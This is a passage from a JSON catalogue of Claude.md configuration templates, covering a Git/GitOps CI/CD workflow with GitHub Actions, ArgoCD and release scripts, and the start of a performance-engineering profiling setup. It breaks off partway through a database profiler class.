cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Install Playwright\n        run: npx playwright install --with-deps\n\n      - name: Start application\n        run: npm run dev &\n\n      - name: Wait for application\n        run: npx wait-on http://localhost:3000\n\n      - name: Run E2E tests\n        run: npm run test:e2e\n\n      - name: Upload test results\n        uses: actions/upload-artifact@v3\n        if: failure()\n        with:\n          name: playwright-report\n          path: playwright-report/\n\n  security-scan:\n    name: Security Scanning\n    runs-on: ubuntu-latest\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Run Trivy vulnerability scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: 'fs'\n          scan-ref: '.'\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n\n      - name: Upload Trivy scan results\n        uses: github/codeql-action/upload-sarif@v2\n        with:\n          sarif_file: 'trivy-results.sarif'\n\n      - name: Snyk security scan\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n        with:\n          args: --severity-threshold=high\n```\n\n### Continuous Deployment\n```yaml\n# .github/workflows/cd.yml\nname: Continuous Deployment\n\non:\n  push:\n    branches: [ main ]\n    tags: [ 'v*' ]\n\njobs:\n  deploy-staging:\n    name: Deploy to Staging\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    environment: staging\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build application\n        run: npm run build\n        env:\n          NODE_ENV: production\n\n      - name: Build Docker image\n        run: |\n          docker build -t myapp:staging .\n          docker tag myapp:staging myregistry.com/myapp:staging\n\n      - name: Login to registry\n        uses: docker/login-action@v2\n        with:\n          registry: myregistry.com\n          username: ${{ secrets.REGISTRY_USERNAME }}\n          password: ${{ secrets.REGISTRY_PASSWORD }}\n\n      - name: Push Docker image\n        run: docker push myregistry.com/myapp:staging\n\n      - name: Update GitOps repository\n        run: |\n          git clone https://${{ secrets.GITOPS_TOKEN }}@github.com/myorg/gitops-repo.git\n          cd gitops-repo\n          sed -i 's|image:.*|image: myregistry.com/myapp:staging|' applications/staging/deployment.yaml\n          git config user.name \"GitHub Actions\"\n          git config user.email \"actions@github.com\"\n          git add .\n          git commit -m \"chore(staging): update image to staging\"\n          git push\n\n  deploy-production:\n    name: Deploy to Production\n    runs-on: ubuntu-latest\n    if: startsWith(github.ref, 'refs/tags/v')\n    environment: production\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Get version from tag\n        id: version\n        run: echo \"version=${GITHUB_REF#refs/tags/}\" >> $GITHUB_OUTPUT\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build application\n        run: npm run build\n        env:\n          NODE_ENV: production\n\n      - name: Build Docker image\n        run: |\n          docker build -t myapp:${{ steps.version.outputs.version }} .\n          docker tag myapp:${{ steps.version.outputs.version }} myregistry.com/myapp:${{ steps.version.outputs.version }}\n          docker tag myapp:${{ steps.version.outputs.version }} myregistry.com/myapp:latest\n\n      - name: Login to registry\n        uses: docker/login-action@v2\n        with:\n          registry: myregistry.com\n          username: ${{ secrets.REGISTRY_USERNAME }}\n          password: ${{ secrets.REGISTRY_PASSWORD }}\n\n      - name: Push Docker images\n        run: |\n          docker push myregistry.com/myapp:${{ steps.version.outputs.version }}\n          docker push myregistry.com/myapp:latest\n\n      - name: Update GitOps repository\n        run: |\n          git clone https://${{ secrets.GITOPS_TOKEN }}@github.com/myorg/gitops-repo.git\n          cd gitops-repo\n          sed -i 's|image:.*|image: myregistry.com/myapp:${{ steps.version.outputs.version }}|' applications/production/deployment.yaml\n          git config user.name \"GitHub Actions\"\n          git config user.email \"actions@github.com\"\n          git add .\n          git commit -m \"chore(production): deploy version ${{ steps.version.outputs.version }}\"\n          git push\n\n      - name: Create GitHub release\n        uses: softprops/action-gh-release@v1\n        with:\n          files: |\n            dist/*.tar.gz\n            dist/*.zip\n          generate_release_notes: true\n```\n\n### Automated Release Management\n```yaml\n# .github/workflows/release.yml\nname: Release Management\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  release:\n    name: Create Release\n    runs-on: ubuntu-latest\n    if: \"!contains(github.event.head_commit.message, 'chore(release)')\"\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n          token: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run tests\n        run: npm run test\n\n      - name: Build application\n        run: npm run build\n\n      - name: Release\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: npx semantic-release\n```\n\n## GitOps Configuration\n\n### ArgoCD Application\n```yaml\n# .gitops/applications/staging/application.yaml\napiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: myapp-staging\n  namespace: argocd\n  finalizers:\n    - resources-finalizer.argocd.argoproj.io\nspec:\n  project: default\n  source:\n    repoURL: https://github.com/myorg/gitops-repo.git\n    targetRevision: HEAD\n    path: applications/staging\n  destination:\n    server: https://kubernetes.default.svc\n    namespace: staging\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true\n      allowEmpty: false\n    syncOptions:\n      - CreateNamespace=true\n      - PrunePropagationPolicy=foreground\n      - PruneLast=true\n    retry:\n      limit: 5\n      backoff:\n        duration: 5s\n        factor: 2\n        maxDuration: 3m\n  revisionHistoryLimit: 10\n```\n\n### Kustomize Overlay\n```yaml\n# .gitops/applications/staging/kustomization.yaml\napiVersion: kustomize.config.k8s.io/v1beta1\nkind: Kustomization\n\nnamespace: staging\n\nresources:\n  - ../../base\n\nimages:\n  - name: myapp\n    newName: myregistry.com/myapp\n    newTag: staging\n\npatchesStrategicMerge:\n  - deployment-patch.yaml\n  - service-patch.yaml\n\nconfigMapGenerator:\n  - name: app-config\n    files:\n      - config.yaml\n    options:\n      disableNameSuffixHash: true\n\nsecretGenerator:\n  - name: app-secrets\n    envs:\n      - secrets.env\n    options:\n      disableNameSuffixHash: true\n```\n\n## Release Automation Scripts\n\n### Semantic Release Configuration\n```json\n{\n  \"branches\": [\n    \"main\",\n    {\n      \"name\": \"develop\",\n      \"prerelease\": \"beta\"\n    }\n  ],\n  \"plugins\": [\n    \"@semantic-release/commit-analyzer\",\n    \"@semantic-release/release-notes-generator\",\n    \"@semantic-release/changelog\",\n    \"@semantic-release/npm\",\n    \"@semantic-release/github\",\n    [\n      \"@semantic-release/git\",\n      {\n        \"assets\": [\n          \"CHANGELOG.md\",\n          \"package.json\",\n          \"package-lock.json\"\n        ],\n        \"message\": \"chore(release): ${nextRelease.version} [skip ci]\\n\\n${nextRelease.notes}\"\n      }\n    ]\n  ],\n  \"preset\": \"conventionalcommits\",\n  \"releaseRules\": [\n    { \"type\": \"feat\", \"release\": \"minor\" },\n    { \"type\": \"fix\", \"release\": \"patch\" },\n    { \"type\": \"perf\", \"release\": \"patch\" },\n    { \"type\": \"revert\", \"release\": \"patch\" },\n    { \"type\": \"docs\", \"scope\": \"README\", \"release\": \"patch\" },\n    { \"type\": \"refactor\", \"release\": \"patch\" },\n    { \"type\": \"style\", \"release\": false },\n    { \"type\": \"chore\", \"release\": false },\n    { \"type\": \"test\", \"release\": false },\n    { \"scope\": \"no-release\", \"release\": false }\n  ]\n}\n```\n\n### Release Preparation Script\n```bash\n#!/bin/bash\n# scripts/release/prepare-release.sh\n\nset -e\n\nVERSION_TYPE=${1:-\"auto\"}\nBRANCH=$(git rev-parse --abbrev-ref HEAD)\n\necho \"🚀 Preparing release from branch: $BRANCH\"\n\n# Ensure we're on the right branch\nif [ \"$BRANCH\" != \"main\" ] && [ \"$BRANCH\" != \"develop\" ]; then\n    echo \"❌ Releases can only be prepared from main or develop branch\"\n    exit 1\nfi\n\n# Ensure working directory is clean\nif [ -n \"$(git status --porcelain)\" ]; then\n    echo \"❌ Working directory is not clean. Please commit or stash changes.\"\n    exit 1\nfi\n\n# Fetch latest changes\ngit fetch origin\n\n# Ensure branch is up to date\nif [ \"$(git rev-parse HEAD)\" != \"$(git rev-parse @{u})\" ]; then\n    echo \"❌ Local branch is not up to date with remote. Please pull latest changes.\"\n    exit 1\nfi\n\n# Run tests\necho \"🧪 Running tests...\"\nnpm run test\n\n# Run linting\necho \"🧹 Running linting...\"\nnpm run lint\n\n# Run build\necho \"🏗️  Building application...\"\nnpm run build\n\n# Generate changelog\necho \"📝 Generating changelog...\"\nnpm run changelog\n\n# Determine version bump\nif [ \"$VERSION_TYPE\" = \"auto\" ]; then\n    # Analyze commits since last release\n    LAST_TAG=$(git describe --tags --abbrev=0 2>/dev/null || echo \"\")\n    \n    if [ -n \"$LAST_TAG\" ]; then\n        COMMITS=$(git log $LAST_TAG..HEAD --oneline)\n    else\n        COMMITS=$(git log --oneline)\n    fi\n    \n    if echo \"$COMMITS\" | grep -q \"^[a-f0-9]\\+ feat\"; then\n        VERSION_TYPE=\"minor\"\n    elif echo \"$COMMITS\" | grep -q \"^[a-f0-9]\\+ fix\"; then\n        VERSION_TYPE=\"patch\"\n    else\n        VERSION_TYPE=\"patch\"\n    fi\nfi\n\necho \"📦 Version bump type: $VERSION_TYPE\"\n\n# Bump version\nnpm version $VERSION_TYPE --no-git-tag-version\n\nNEW_VERSION=$(node -p \"require('./package.json').version\")\n\necho \"✅ Prepared release version: v$NEW_VERSION\"\necho \"   Next steps:\"\necho \"   1. Review changes\"\necho \"   2. Commit version bump: git commit -am 'chore(release): v$NEW_VERSION'\"\necho \"   3. Create and push tag: git tag v$NEW_VERSION && git push origin v$NEW_VERSION\"\n```\n\n## Advanced Git Commands and Utilities\n\n### Git Aliases Configuration\n```bash\n# Add to ~/.gitconfig or run as commands\n\n# Workflow aliases\ngit config --global alias.sw 'switch'\ngit config --global alias.co 'checkout'\ngit config --global alias.br 'branch'\ngit config --global alias.st 'status --short --branch'\ngit config --global alias.ci 'commit'\ngit config --global alias.unstage 'reset HEAD --'\ngit config --global alias.last 'log -1 HEAD'\n\n# Enhanced logging\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\ngit config --global alias.lga \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --all\"\n\n# Branch management\ngit config --global alias.bra 'branch -a'\ngit config --global alias.brd 'branch -d'\ngit config --global alias.brD 'branch -D'\ngit config --global alias.brc 'checkout -b'\n\n# Stash operations\ngit config --global alias.sl 'stash list'\ngit config --global alias.sa 'stash apply'\ngit config --global alias.ss 'stash save'\ngit config --global alias.sp 'stash pop'\n\n# Advanced operations\ngit config --global alias.amend 'commit --amend --no-edit'\ngit config --global alias.amendm 'commit --amend'\ngit config --global alias.pushf 'push --force-with-lease'\ngit config --global alias.pullr 'pull --rebase'\n\n# Find operations\ngit config --global alias.find 'log --all --full-history -- '\ngit config --global alias.grep 'grep --break --heading --line-number'\n\n# Cleanup operations\ngit config --global alias.cleanup 'remote prune origin'\ngit config --global alias.prune-branches '!git branch --merged | grep -v \"\\*\\|main\\|develop\" | xargs -n 1 git branch -d'\n```\n\n### GitOps Sync Script\n```bash\n#!/bin/bash\n# scripts/gitops/sync-manifests.sh\n\nset -e\n\nENVIRONMENT=${1:-\"staging\"}\nIMAGE_TAG=${2:-\"latest\"}\nGITOPS_REPO=${3:-\"git@github.com:myorg/gitops-repo.git\"}\n\necho \"🔄 Syncing GitOps manifests for $ENVIRONMENT\"\n\n# Clone or update GitOps repository\nif [ -d \"gitops-repo\" ]; then\n    cd gitops-repo\n    git pull origin main\nelse\n    git clone $GITOPS_REPO gitops-repo\n    cd gitops-repo\nfi\n\n# Update application manifests\nMANIFEST_PATH=\"applications/$ENVIRONMENT\"\n\nif [ ! -d \"$MANIFEST_PATH\" ]; then\n    echo \"❌ Environment $ENVIRONMENT not found in GitOps repository\"\n    exit 1\nfi\n\n# Update image tag in Kustomization\nsed -i \"s|newTag:.*|newTag: $IMAGE_TAG|\" $MANIFEST_PATH/kustomization.yaml\n\n# Validate manifests\necho \"✅ Validating Kubernetes manifests...\"\nkubectl kustomize $MANIFEST_PATH > /tmp/manifest-validation.yaml\nkubectl --dry-run=client apply -f /tmp/manifest-validation.yaml\n\n# Commit and push changes\ngit add .\nif git diff --staged --quiet; then\n    echo \"ℹ️  No changes to commit\"\nelse\n    git commit -m \"chore($ENVIRONMENT): update image to $IMAGE_TAG\"\n    git push origin main\n    echo \"✅ GitOps manifests updated successfully\"\nfi\n\ncd ..\nrm -rf gitops-repo\n```\n\n## Workflow Documentation\n\n### Developer Workflow\n1. **Feature Development**:\n   - Create feature branch from develop: `git checkout -b feature/new-feature develop`\n   - Implement feature with regular commits using conventional commit format\n   - Run local tests and quality checks\n   - Push branch and create Pull Request\n\n2. **Code Review Process**:\n   - Automated CI checks must pass\n   - Require at least 2 approvals from code owners\n   - All conversations must be resolved\n   - Branch must be up to date with target branch\n\n3. **Release Process**:\n   - Merge develop to main triggers release preparation\n   - Semantic versioning automatically determined from commit messages\n   - Automated testing in staging environment\n   - Manual approval required for production deployment\n\n4. **Hotfix Process**:\n   - Create hotfix branch from main: `git checkout -b hotfix/critical-fix main`\n   - Implement fix and test thoroughly\n   - Fast-track review process for critical issues\n   - Deploy to production and back-merge to develop\n\nThis advanced Git workflow provides enterprise-grade automation, quality control, and deployment capabilities while maintaining developer productivity and code quality standards.",
      "tags": [
        {
          "tag": {
            "id": "git",
            "name": "git",
            "slug": "git"
          }
        },
        {
          "tag": {
            "id": "gitops",
            "name": "gitops",
            "slug": "gitops"
          }
        },
        {
          "tag": {
            "id": "cicd",
            "name": "cicd",
            "slug": "cicd"
          }
        },
        {
          "tag": {
            "id": "automation",
            "name": "automation",
            "slug": "automation"
          }
        },
        {
          "tag": {
            "id": "workflows",
            "name": "workflows",
            "slug": "workflows"
          }
        },
        {
          "tag": {
            "id": "branching",
            "name": "branching",
            "slug": "branching"
          }
        },
        {
          "tag": {
            "id": "release-management",
            "name": "release-management",
            "slug": "release-management"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 30,
        "copies": 57
      },
      "_count": {
        "votes": 22,
        "copies": 162
      },
      "difficulty": "ADVANCED",
      "language": "Shell",
      "framework": "Git + GitHub Actions + ArgoCD",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "performance-engineering",
      "title": "Performance Engineering + Profiling",
      "slug": "performance-engineering-profiling-optimization",
      "tagline": "Cross-Platform Performance configuration for advanced developers",
      "description": "Comprehensive performance engineering setup with profiling, monitoring, optimization techniques, and performance testing across the full stack.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Performance Engineering + Profiling\n\n## Project Overview\n\nThis is a comprehensive performance engineering setup covering profiling, monitoring, optimization techniques, and performance testing across frontend, backend, database, and infrastructure layers. Focus on measurable performance improvements and systematic optimization approaches.\n\n## Performance Philosophy\n\n### Performance Engineering Principles\n1. **Measure First**: Always profile before optimizing\n2. **Data-Driven Decisions**: Use metrics to guide optimization efforts\n3. **Systematic Approach**: Follow a methodical performance improvement process\n4. **Continuous Monitoring**: Implement ongoing performance tracking\n5. **User-Centric Metrics**: Focus on user experience over technical metrics\n\n### Performance Optimization Hierarchy\n1. **Algorithm Optimization**: Choose the right algorithms and data structures\n2. **Code-Level Optimization**: Optimize critical code paths\n3. **System Architecture**: Design for performance from the ground up\n4. **Infrastructure Scaling**: Scale horizontally and vertically as needed\n5. **Caching Strategies**: Implement multi-layer caching\n\n## Technology Stack\n\n- **Profiling**: Chrome DevTools, Node.js Profiler, async-profiler (Java), pprof (Go)\n- **Monitoring**: Prometheus, Grafana, New Relic, Datadog\n- **Load Testing**: k6, Artillery, JMeter, Gatling\n- **Database Profiling**: SQL Explain Plans, Database-specific tools\n- **Frontend Performance**: Lighthouse, WebPageTest, Core Web Vitals\n- **Infrastructure**: Docker, Kubernetes, CDN, Load Balancers\n\n## Project Structure\n\n```\nperformance-engineering/\n├── profiling/\n│   ├── frontend/            # Frontend performance profiling\n│   ├── backend/             # Backend application profiling\n│   ├── database/            # Database query optimization\n│   └── infrastructure/      # System-level profiling\n├── monitoring/\n│   ├── metrics/             # Custom metrics and dashboards\n│   ├── alerting/            # Performance alerting rules\n│   ├── logging/             # Performance logging\n│   └── tracing/             # Distributed tracing setup\n├── testing/\n│   ├── load-tests/          # Load and stress testing\n│   ├── benchmark/           # Microbenchmarks\n│   ├── synthetic/           # Synthetic monitoring\n│   └── chaos/               # Chaos engineering tests\n├── optimization/\n│   ├── algorithms/          # Algorithm optimization examples\n│   ├── caching/             # Caching strategies\n│   ├── database/            # Database optimization\n│   └── infrastructure/      # Infrastructure optimization\n└── tools/\n    ├── scripts/             # Performance analysis scripts\n    ├── dashboards/          # Monitoring dashboards\n    └── reports/             # Performance reports\n```\n\n## Frontend Performance Optimization\n\n### Core Web Vitals Monitoring\n```typescript\n// profiling/frontend/core-web-vitals.ts\nexport class CoreWebVitalsMonitor {\n  private observer: PerformanceObserver | null = null;\n\n  constructor() {\n    this.initializeObserver();\n  }\n\n  private initializeObserver(): void {\n    if ('PerformanceObserver' in window) {\n      this.observer = new PerformanceObserver((list) => {\n        list.getEntries().forEach((entry) => {\n          this.handlePerformanceEntry(entry);\n        });\n      });\n\n      // Observe all performance entry types\n      this.observer.observe({ \n        entryTypes: ['navigation', 'resource', 'paint', 'layout-shift', 'largest-contentful-paint'] \n      });\n    }\n  }\n\n  private handlePerformanceEntry(entry: PerformanceEntry): void {\n    switch (entry.entryType) {\n      case 'navigation':\n        this.analyzeNavigationTiming(entry as PerformanceNavigationTiming);\n        break;\n      case 'resource':\n        this.analyzeResourceTiming(entry as PerformanceResourceTiming);\n        break;\n      case 'paint':\n        this.analyzePaintTiming(entry);\n        break;\n      case 'layout-shift':\n        this.analyzeCLS(entry as any);\n        break;\n      case 'largest-contentful-paint':\n        this.analyzeLCP(entry as any);\n        break;\n    }\n  }\n\n  private analyzeNavigationTiming(entry: PerformanceNavigationTiming): void {\n    const metrics = {\n      dns: entry.domainLookupEnd - entry.domainLookupStart,\n      tcp: entry.connectEnd - entry.connectStart,\n      ssl: entry.connectEnd - entry.secureConnectionStart,\n      ttfb: entry.responseStart - entry.requestStart,\n      download: entry.responseEnd - entry.responseStart,\n      domProcessing: entry.domContentLoadedEventStart - entry.responseEnd,\n      domReady: entry.domContentLoadedEventEnd - entry.navigationStart,\n      pageLoad: entry.loadEventEnd - entry.navigationStart\n    };\n\n    console.log('Navigation Performance:', metrics);\n    this.sendMetrics('navigation', metrics);\n  }\n\n  private analyzeResourceTiming(entry: PerformanceResourceTiming): void {\n    const resourceMetrics = {\n      name: entry.name,\n      duration: entry.duration,\n      size: entry.transferSize,\n      cached: entry.transferSize === 0 && entry.decodedBodySize > 0,\n      blocking: entry.renderBlockingStatus === 'blocking'\n    };\n\n    // Flag slow resources\n    if (entry.duration > 1000) {\n      console.warn('Slow resource detected:', resourceMetrics);\n      this.sendAlert('slow_resource', resourceMetrics);\n    }\n  }\n\n  private analyzeLCP(entry: any): void {\n    const lcp = entry.startTime;\n    console.log('Largest Contentful Paint:', lcp);\n    \n    // LCP should be under 2.5s for good user experience\n    if (lcp > 2500) {\n      this.sendAlert('poor_lcp', { value: lcp, threshold: 2500 });\n    }\n    \n    this.sendMetrics('lcp', { value: lcp });\n  }\n\n  private analyzeCLS(entry: any): void {\n    const cls = entry.value;\n    console.log('Cumulative Layout Shift:', cls);\n    \n    // CLS should be under 0.1 for good user experience\n    if (cls > 0.1) {\n      this.sendAlert('poor_cls', { value: cls, threshold: 0.1 });\n    }\n    \n    this.sendMetrics('cls', { value: cls });\n  }\n\n  private sendMetrics(type: string, data: any): void {\n    // Send to analytics service\n    fetch('/api/performance-metrics', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ type, data, timestamp: Date.now() })\n    }).catch(console.error);\n  }\n\n  private sendAlert(type: string, data: any): void {\n    // Send performance alerts\n    fetch('/api/performance-alerts', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ type, data, timestamp: Date.now() })\n    }).catch(console.error);\n  }\n\n  // Manual performance measurement\n  measureCustomMetric(name: string, fn: () => void): number {\n    const start = performance.now();\n    fn();\n    const end = performance.now();\n    const duration = end - start;\n    \n    this.sendMetrics('custom', { name, duration });\n    return duration;\n  }\n\n  // Resource loading optimization\n  preloadCriticalResources(resources: string[]): void {\n    resources.forEach(resource => {\n      const link = document.createElement('link');\n      link.rel = 'preload';\n      link.href = resource;\n      \n      if (resource.endsWith('.css')) {\n        link.as = 'style';\n      } else if (resource.endsWith('.js')) {\n        link.as = 'script';\n      } else if (resource.match(/.(jpg|jpeg|png|webp)$/)) {\n        link.as = 'image';\n      }\n      \n      document.head.appendChild(link);\n    });\n  }\n}\n\n// Initialize monitoring\nconst performanceMonitor = new CoreWebVitalsMonitor();\n\n// Export for global use\n(window as any).performanceMonitor = performanceMonitor;\n```\n\n### Frontend Bundle Optimization\n```typescript\n// optimization/frontend/bundle-analyzer.ts\nimport { BundleAnalyzerPlugin } from 'webpack-bundle-analyzer';\nimport CompressionPlugin from 'compression-webpack-plugin';\n\nexport const webpackOptimizationConfig = {\n  // Code splitting\n  optimization: {\n    splitChunks: {\n      cacheGroups: {\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name: 'vendors',\n          chunks: 'all',\n          priority: 10\n        },\n        common: {\n          name: 'common',\n          minChunks: 2,\n          chunks: 'all',\n          priority: 5,\n          reuseExistingChunk: true\n        }\n      }\n    },\n    // Tree shaking\n    usedExports: true,\n    sideEffects: false,\n    // Runtime chunk\n    runtimeChunk: 'single'\n  },\n\n  // Performance budgets\n  performance: {\n    maxAssetSize: 250000,\n    maxEntrypointSize: 250000,\n    hints: 'warning'\n  },\n\n  plugins: [\n    // Bundle analysis\n    new BundleAnalyzerPlugin({\n      analyzerMode: 'static',\n      openAnalyzer: false,\n      reportFilename: 'bundle-report.html'\n    }),\n\n    // Compression\n    new CompressionPlugin({\n      algorithm: 'gzip',\n      test: /.(js|css|html|svg)$/,\n      threshold: 8192,\n      minRatio: 0.8\n    })\n  ]\n};\n\n// Lazy loading utility\nexport class LazyLoader {\n  private loadedModules = new Map<string, Promise<any>>();\n\n  async loadModule<T>(moduleFactory: () => Promise<{ default: T }>): Promise<T> {\n    const moduleKey = moduleFactory.toString();\n    \n    if (!this.loadedModules.has(moduleKey)) {\n      this.loadedModules.set(moduleKey, moduleFactory());\n    }\n    \n    const module = await this.loadedModules.get(moduleKey)!;\n    return module.default;\n  }\n\n  // Image lazy loading\n  observeImages(): void {\n    const imageObserver = new IntersectionObserver((entries) => {\n      entries.forEach(entry => {\n        if (entry.isIntersecting) {\n          const img = entry.target as HTMLImageElement;\n          if (img.dataset.src) {\n            img.src = img.dataset.src;\n            img.removeAttribute('data-src');\n            imageObserver.unobserve(img);\n          }\n        }\n      });\n    });\n\n    document.querySelectorAll('img[data-src]').forEach(img => {\n      imageObserver.observe(img);\n    });\n  }\n}\n```\n\n## Backend Performance Profiling\n\n### Node.js Performance Profiling\n```typescript\n// profiling/backend/nodejs-profiler.ts\nimport { performance, PerformanceObserver } from 'perf_hooks';\nimport { createWriteStream } from 'fs';\nimport { promisify } from 'util';\n\nexport class NodeJSProfiler {\n  private metricsLog = createWriteStream('performance-metrics.log', { flags: 'a' });\n  private observer: PerformanceObserver;\n\n  constructor() {\n    this.initializeObserver();\n  }\n\n  private initializeObserver(): void {\n    this.observer = new PerformanceObserver((list) => {\n      list.getEntries().forEach((entry) => {\n        this.logMetric({\n          name: entry.name,\n          duration: entry.duration,\n          startTime: entry.startTime,\n          timestamp: new Date().toISOString()\n        });\n      });\n    });\n\n    this.observer.observe({ entryTypes: ['measure', 'function'] });\n  }\n\n  // Method decorator for automatic profiling\n  profile(target: any, propertyName: string, descriptor: PropertyDescriptor): void {\n    const method = descriptor.value;\n\n    descriptor.value = async function (...args: any[]) {\n      const measureName = `${target.constructor.name}.${propertyName}`;\n      const startMark = `${measureName}-start`;\n      const endMark = `${measureName}-end`;\n\n      performance.mark(startMark);\n      \n      try {\n        const result = await method.apply(this, args);\n        performance.mark(endMark);\n        performance.measure(measureName, startMark, endMark);\n        return result;\n      } catch (error) {\n        performance.mark(endMark);\n        performance.measure(`${measureName}-error`, startMark, endMark);\n        throw error;\n      }\n    };\n  }\n\n  // Manual timing\n  async timeFunction<T>(name: string, fn: () => Promise<T>): Promise<T> {\n    const startTime = performance.now();\n    \n    try {\n      const result = await fn();\n      const endTime = performance.now();\n      \n      this.logMetric({\n        name,\n        duration: endTime - startTime,\n        status: 'success',\n        timestamp: new Date().toISOString()\n      });\n      \n      return result;\n    } catch (error) {\n      const endTime = performance.now();\n      \n      this.logMetric({\n        name: `${name}-error`,\n        duration: endTime - startTime,\n        status: 'error',\n        error: error.message,\n        timestamp: new Date().toISOString()\n      });\n      \n      throw error;\n    }\n  }\n\n  // Memory usage tracking\n  trackMemoryUsage(): void {\n    setInterval(() => {\n      const memUsage = process.memoryUsage();\n      this.logMetric({\n        name: 'memory-usage',\n        heapUsed: memUsage.heapUsed,\n        heapTotal: memUsage.heapTotal,\n        external: memUsage.external,\n        rss: memUsage.rss,\n        timestamp: new Date().toISOString()\n      });\n    }, 30000); // Every 30 seconds\n  }\n\n  // CPU profiling\n  startCPUProfiling(): void {\n    const profiler = require('v8-profiler-next');\n    profiler.startProfiling('CPU');\n    \n    setTimeout(() => {\n      const profile = profiler.stopProfiling('CPU');\n      profile.export((error: any, result: string) => {\n        if (!error) {\n          require('fs').writeFileSync('cpu-profile.cpuprofile', result);\n        }\n        profile.delete();\n      });\n    }, 60000); // Profile for 1 minute\n  }\n\n  private logMetric(metric: any): void {\n    this.metricsLog.write(JSON.stringify(metric) + '\\n');\n    \n    // Send to monitoring system\n    if (process.env.NODE_ENV === 'production') {\n      this.sendToMonitoring(metric);\n    }\n  }\n\n  private async sendToMonitoring(metric: any): Promise<void> {\n    // Implementation depends on your monitoring system\n    // Example: Prometheus, DataDog, New Relic, etc.\n  }\n}\n\n// Usage example\nexport class UserService {\n  private profiler = new NodeJSProfiler();\n\n  @profile\n  async createUser(userData: any): Promise<any> {\n    // Simulate database operation\n    await new Promise(resolve => setTimeout(resolve, 100));\n    return { id: Math.random(), ...userData };\n  }\n\n  async processUsers(users: any[]): Promise<any[]> {\n    return this.profiler.timeFunction('process-users', async () => {\n      return Promise.all(users.map(user => this.createUser(user)));\n    });\n  }\n}\n```\n\n### Database Performance Optimization\n```sql\n-- profiling/database/query-optimization.sql\n\n-- Enable query logging and analysis\nSET log_statement = 'all';\nSET log_min_duration_statement = 1000; -- Log queries taking > 1s\n\n-- Analyze slow queries\nSELECT \n    query,\n    calls,\n    total_time,\n    mean_time,\n    stddev_time,\n    rows,\n    100.0 * shared_blks_hit / nullif(shared_blks_hit + shared_blks_read, 0) AS hit_percent\nFROM pg_stat_statements \nORDER BY total_time DESC \nLIMIT 20;\n\n-- Index usage analysis\nSELECT \n    schemaname,\n    tablename,\n    indexname,\n    idx_scan as index_scans,\n    idx_tup_read as tuples_read,\n    idx_tup_fetch as tuples_fetched\nFROM pg_stat_user_indexes \nORDER BY idx_scan DESC;\n\n-- Table bloat analysis\nSELECT \n    schemaname,\n    tablename,\n    pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as size,\n    pg_size_pretty(pg_relation_size(schemaname||'.'||tablename)) as table_size,\n    pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename) - pg_relation_size(schemaname||'.'||tablename)) as index_size\nFROM pg_tables \nWHERE schemaname = 'public'\nORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;\n```\n\n```typescript\n// profiling/database/query-profiler.ts\nimport { Pool, PoolClient } from 'pg';\n\nexport class DatabaseProfiler {\n  private pool: Pool;\n  private slowQueryThreshold = 1000; // 1 second\n\n  constructor(pool: Pool) {\n    this.pool = pool;\n  }\n\n  async profileQuery<T>(\n    query: string, \n    params: any[] = [], \n    context: string = ''\n  ): Promise<{ result: T; metrics: any }> {\n    const client = await this.pool.connect();\n    const startTime = performance.now();\n    let result: any;\n    let error: Error | null = null;\n\n    try {\n      // Enable query analysis\n      await client.query('SET enable_seqscan = off'); // Force index usage for testing\n      await client.query('SET work_mem = \\'4MB\\''); // Optimize for this query\n      \n      const queryResult = await client.query(query, params);\n      result = queryResult.rows;\n      \n      const endTime = performance.now();\n      const duration = endTime - startTime;\n\n      // Get query execution plan\n      const explainResult = await client.query(`EXPLAIN (ANALYZE, BUFFERS, FORMAT JSON) ${query}`, params);\n      const executionPlan = explainResult.rows[0]['QUERY PLAN'][0];\n\n      const metrics = {\n        query: query.substring(0, 100) + '...',\n        context,\n        duration,\n        rowCount: 